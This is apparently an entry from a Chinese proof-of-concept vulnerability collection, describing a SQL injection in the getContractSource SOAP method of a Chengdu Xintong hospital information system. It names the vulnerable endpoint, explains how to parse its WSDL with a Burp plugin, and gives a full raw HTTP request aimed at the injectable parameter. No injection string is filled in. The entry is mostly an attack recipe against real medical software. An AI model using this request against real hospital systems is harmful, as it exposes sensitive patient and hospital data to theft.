---
source: "wy876 漏洞文库"
---

# 成都信通网易医疗科技发展有限公司HIS系统getContractSource存在SQL注入漏洞

# 一、漏洞简介
成都信通网易医疗科技发展有限公司总部位于四川成都高新区天府软件园，在国内医疗软件行业中率先采用Java技术，融入国际国内标准，整体设计，持续研发，先后形成了“智慧云医院信息平台”、“医共体信息平台”、“互联网医院平台”、“医养融合信息平台”等新一代一系列自主知识产权产品，全面覆盖了单体医院业务、区域医疗、医共体、“互联网+健康”等信息化建设领域。成都信通网易医疗科技发展有限公司HIS系统getContractSource存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
    - 成都信通网易医疗科技发展有限公司HIS系统（基于电子病历的医院信息化平台）

# 三、特征


# 四、漏洞复现
    1. 漏洞位置

在下列`nzzManager`接口下的`getContractSource`参数

```plain
/xtHisService/services
```


    2. 使用burp抓包，使用wsdl插件解析

```plain
/xtHisService/services/nzzManager?wsdl
```

[wsdler.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222128209-b940588a-42dd-4499-95bf-a6da305a86b9.jar)


    3. 数据包

```plain
POST /xtHisService/services/nzzManager HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=0A4C07C0C8A7CFF9A03AD7B586FFCBBE
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: xx.xx.xx.xx
Content-Length: 322

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imp="http://imp.nzz.ws.manager.cdxt.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <imp:getContractSource>
         <!--type: string-->
         <arg0>gero et</arg0>
      </imp:getContractSource>
   </soapenv:Body>
</soapenv:Envelope>
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ia05az6it1imevtb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
